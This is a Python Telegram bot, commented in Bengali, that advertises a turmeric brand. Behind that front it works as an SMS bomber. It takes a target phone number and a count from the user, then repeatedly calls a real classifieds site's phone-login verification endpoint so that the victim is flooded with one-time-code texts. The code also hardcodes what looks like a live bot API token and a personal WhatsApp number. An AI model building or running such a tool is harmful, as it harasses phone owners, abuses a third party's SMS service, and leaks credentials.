import telebot
import requests
import time
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস
API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
CHANNEL_USERNAME = '@developer_of_maruf' 

# ব্যানারের ডাইরেক্ট লিঙ্ক (ImgBB থেকে নেওয়া)
PHOTO_URL = "https://i.ibb.co/6R0VjY8/banner.jpg" 
WHATSAPP_LINK = "https://wa.me/8801621743805?text=আমি_খাঁটি_হলুদ_অর্ডার_করতে_চাই"

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# ২. Render সার্ভার সচল রাখার জন্য Flask
app = Flask('')
@app.route('/')
def home(): return "Mritika Bot is Online!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# ৩. স্টার্ট কমান্ড (ধাপে ধাপে আলাদা মেসেজ আসবে)
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    
    if check_join(chat_id):
        # প্রথম মেসেজ: শুধু ছবি ও অর্ডারের বাটন
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 খাঁটি হলুদ অর্ডার (WhatsApp)", url=WHATSAPP_LINK))
        
        bot.send_photo(
            chat_id, 
            PHOTO_URL, 
            caption="✨ **মৃত্তিকা (Mrittika) অরিজিনাল হলুদের গুঁড়া** ✨\nরান্নায় আসল রঙ আর গন্ধ পেতে ১০০% খাঁটি ও ভেজাল মুক্ত মৃত্তিকা হলুদ ব্যবহার করুন।",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
        # ১.৫ সেকেন্ড বিরতি দিয়ে দ্বিতীয় মেসেজ
        time.sleep(1.5)
        bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
        
        # ১ সেকেন্ড বিরতি দিয়ে তৃতীয় মেসেজ (নাম্বার চাওয়া)
        time.sleep(1)
        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন আপনার নাম্বারটি দিন (যেমন: 017xxxxxxxx):")
        bot.register_next_step_handler(msg, get_number)
        
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ জয়েন হননি!", show_alert=True)

# ৪. নাম্বার ও বোম্বিং লজিক
def get_number(message):
    if message.text == "/start":
        welcome(message)
        return
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.send_message(message.chat.id, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = message.text
    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান?")
    bot.register_next_step_handler(msg, send_bomber)

def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
        for i in range(amount):
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
    except:
        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
 
